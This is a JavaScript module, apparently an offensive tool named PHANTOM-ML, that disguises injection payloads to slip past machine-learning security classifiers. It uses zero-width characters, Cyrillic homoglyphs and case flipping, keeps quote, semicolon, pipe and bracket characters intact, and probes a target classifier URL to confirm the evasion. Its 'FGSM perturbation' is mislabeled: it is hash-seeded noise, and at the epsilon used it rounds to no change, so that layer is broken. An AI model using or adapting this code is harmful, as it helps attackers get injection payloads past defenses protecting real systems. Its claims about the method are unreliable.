const axios = require('axios');
const crypto = require('crypto');


const generateAdversarialPerturbation = (payloadString, epsilon = 0.15) => {
    const bytes = Buffer.from(payloadString, 'utf-8');
    const perturbedBytes = Buffer.alloc(bytes.length);

    const seed = crypto.createHash('md5').update(payloadString).digest();
    let seedIdx = 0;

    for (let i = 0; i < bytes.length; i++) {
        const original = bytes[i];

        const gradientSign = ((seed[seedIdx % seed.length] & 0x01) === 1) ? 1 : -1;
        seedIdx++;


        const perturbation = Math.round(epsilon * gradientSign * (seed[seedIdx % seed.length] % 3));
        seedIdx++;

        let newByte = original + perturbation;

        if (newByte < 32) newByte = 32;
        if (newByte > 126) newByte = 126;

        const criticalChars = [0x27, 0x22, 0x3B, 0x7C, 0x26, 0x60, 0x3C, 0x3E, 0x2F, 0x5C, 0x3D, 0x28, 0x29];
        if (criticalChars.includes(original)) {
            perturbedBytes[i] = original;
        } else {
            perturbedBytes[i] = newByte;
        }
    }

    return perturbedBytes.toString('utf-8');
};


const injectZeroWidthEvasion = (payload) => {
    const zwChars = [
        '\u200B', // Zero-Width Space
        '\u200C', // Zero-Width Non-Joiner
        '\u200D', // Zero-Width Joiner
        '\uFEFF' // Byte Order Mark
    ];

    let evaded = '';
    for (let i = 0; i < payload.length; i++) {
        evaded += payload[i];
        if (Math.random() > 0.7 && /[a-zA-Z]/.test(payload[i])) {
            evaded += zwChars[Math.floor(Math.random() * zwChars.length)];
        }
    }

    return evaded;
};


const homoglyphSubstitution = (payload) => {
    const homoglyphs = {
        'a': '\u0430', // Cyrillic Small Letter A
        'c': '\u0441', // Cyrillic Small Letter ES
        'e': '\u0435', // Cyrillic Small Letter IE
        'o': '\u043E', // Cyrillic Small Letter O
        'p': '\u0440', // Cyrillic Small Letter ER
        's': '\u0455', // Cyrillic Small Letter DZE
        'x': '\u0445', // Cyrillic Small Letter HA
        'y': '\u0443', // Cyrillic Small Letter U
        'i': '\u0456', // Cyrillic Small Letter Byelorussian-Ukrainian I
        'd': '\u0501', // Cyrillic Small Letter Komi DE
    };

    let substituted = '';
    for (const char of payload) {
        const lower = char.toLowerCase();
        if (homoglyphs[lower] && Math.random() > 0.6) {
            substituted += char === lower ? homoglyphs[lower] : homoglyphs[lower].toUpperCase();
        } else {
            substituted += char;
        }
    }

    return substituted;
};


const caseRandomization = (payload) => {
    return payload.split('').map(c => {
        if (/[a-zA-Z]/.test(c) && Math.random() > 0.5) {
            return c === c.toLowerCase() ? c.toUpperCase() : c.toLowerCase();
        }
        return c;
    }).join('');
};


const runPhantomMLEvasion = async(originalPayload, targetClassifierUrl = null, layers = ['perturbation', 'zerowidth', 'homoglyph']) => {
    console.log(`\n[👻] =============================================`);
    console.log(`[👻] PHANTOM-ML: Adversarial ML Probing Active`);
    console.log(`[👻] Original Payload: ${originalPayload.substring(0, 50)}...`);
    console.log(`[👻] Evasion Layers: ${layers.join(' → ')}`);
    console.log(`[👻] =============================================\n`);

    let evadedPayload = originalPayload;
    const appliedLayers = [];

    if (layers.includes('perturbation')) {
        evadedPayload = generateAdversarialPerturbation(evadedPayload, 0.12);
        appliedLayers.push('FGSM-Byte-Perturbation');
        console.log(`[👻] Layer 1: FGSM Perturbation applied (ε=0.12).`);
    }

    if (layers.includes('zerowidth')) {
        evadedPayload = injectZeroWidthEvasion(evadedPayload);
        appliedLayers.push('Zero-Width-Unicode-Injection');
        console.log(`[👻] Layer 2: Zero-width character injection applied.`);
    }

    if (layers.includes('homoglyph')) {
        evadedPayload = homoglyphSubstitution(evadedPayload);
        appliedLayers.push('Homoglyph-Substitution');
        console.log(`[👻] Layer 3: Homoglyph substitution applied.`);
    }

    if (layers.includes('case')) {
        evadedPayload = caseRandomization(evadedPayload);
        appliedLayers.push('Case-Randomization');
        console.log(`[👻] Layer 4: Case randomization applied.`);
    }

    let probeResult = null;
    if (targetClassifierUrl) {
        console.log(`[👻] Probing target classifier at ${targetClassifierUrl}...`);
        try {
            const originalProbe = await axios.post(targetClassifierUrl, { payload: originalPayload }, { timeout: 3000 });
            const origScore = originalProbe.data.confidence || 0;
            const origMalicious = originalProbe.data.is_malicious;

            const evadedProbe = await axios.post(targetClassifierUrl, { payload: evadedPayload }, { timeout: 3000 });
            const evadedScore = evadedProbe.data.confidence || 0;
            const evadedMalicious = evadedProbe.data.is_malicious;

            probeResult = {
                originalDetected: origMalicious,
                originalConfidence: origScore,
                evadedDetected: evadedMalicious,
                evadedConfidence: evadedScore,
                evasionSuccess: origMalicious && !evadedMalicious
            };

            if (probeResult.evasionSuccess) {
                console.log(`[💀] PHANTOM-ML SUCCESS: Classifier blinded! (${origScore}% → ${evadedScore}%)`);
            } else if (!evadedMalicious) {
                console.log(`[✔] Payload classified as benign (Confidence: ${evadedScore}%).`);
            } else {
                console.log(`[⚠️] Evasion partial: Confidence dropped from ${origScore}% to ${evadedScore}%.`);
            }
        } catch (e) {
            console.log(`[!] Classifier probe failed: ${e.message}`);
        }
    }

    const payloadHash = crypto.createHash('sha256').update(evadedPayload).digest('hex');

    console.log(`\n[👻] PHANTOM-ML Pipeline Complete.`);
    console.log(`[👻] Evaded Payload Hash: ${payloadHash.substring(0, 16)}...`);

    return {
        originalPayload,
        evadedPayload,
        appliedLayers,
        payloadHash,
        probeResult
    };
};

module.exports = { runPhantomMLEvasion, generateAdversarialPerturbation, injectZeroWidthEvasion, homoglyphSubstitution };